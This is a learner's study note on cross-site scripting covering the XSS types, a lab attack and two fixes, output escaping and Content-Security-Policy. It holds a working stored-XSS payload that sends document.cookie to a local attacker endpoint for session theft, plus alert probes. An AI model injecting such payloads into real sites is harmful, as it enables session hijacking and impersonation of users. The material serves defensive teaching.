# Day 8 — XSS (Cross-Site Scripting)

## What it is
- Getting **your own JavaScript to run inside someone else's page**.
- The browser receives one stream of HTML and **can't tell** the site's code from user input. If user input containing tags reaches the page unescaped, the browser runs it as trusted first-party code.
- The master key: a script in the page can read non-HttpOnly cookies, read localStorage tokens, read a CSRF token out of a form and submit it, change the page, log keystrokes.

## Why it happens — two things must go wrong
1. User input gets **into** a page (comment, profile, search echo).
2. The server inserts it **without escaping** HTML special characters.

## Three types
| Type | Where the input lives |
|---|---|
| Reflected | in the URL/request, echoed in the immediate response |
| **Stored** | saved on the server, served to everyone (worst) |
| DOM-based | never hits the server, inserted by page JS |

## The attack (built)
- `<b>hello</b>` posted as a comment rendered **bold** → proof input is treated as HTML, not text.
- `<script>alert("XSS")</script>` → popup fired → arbitrary JS runs. `alert` is just the "did it run?" probe.
- **Stored:** saved in the comments list → fires for **every** visitor, forever.

## Session theft chain (the real payload)
```html
<script>
fetch("http://127.0.0.1:9000/steal?c=" + encodeURIComponent(document.cookie), {mode:"no-cors"});
</script>
```
- Reads `document.cookie` (works only because cookie was NOT HttpOnly), ships it to attacker's server, silently.
- Then reuse the stolen session_id → impersonate the user, no password.

## What does NOT stop XSS
- HttpOnly / SameSite / CSRF tokens: those stop an **outside** page acting on your site. XSS runs **inside** your page as first-party code.
- **CORS is not a defense against exfiltration.** CORS blocks a script from **reading** a cross-origin *response*; it does NOT stop the request being **sent**. The cookie still leaves (`200 OK`), attacker doesn't need the reply.

## Fix 1 — escape at output (removes the vuln)
```python
from markupsafe import escape
page += f"<div>{escape(c)}</div>"
```
- `<` → `&lt;`, `>` → `&gt;` etc. `<script>` becomes visible text, not code.
- **Principle: escape data at the moment you place it into a context, for that context** (HTML-escape into HTML, URL-encode into a URL, JS-escape into JS).
- React does this automatically for `{value}`; `dangerouslySetInnerHTML` skips it → reopens the hole.

## Fix 2 — CSP (second layer, defense in depth)
```python
response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'"
```
- Tells the browser which scripts may run. `script-src 'self'` = only scripts from my own domain → **inline `<script>` is blocked**.
- Both XSS payloads were inline → CSP blocks them even with escaping removed (tested: Console shows "Refused to execute inline script").
- Allowlist pattern again: deny by default, permit only what you name.
- **Caveat:** `'unsafe-inline'` in a CSP turns this protection off → a present-but-weak CSP. "Header present" (Day 1 headcheck) isn't enough; value must be checked.

## In my own words
-
-
-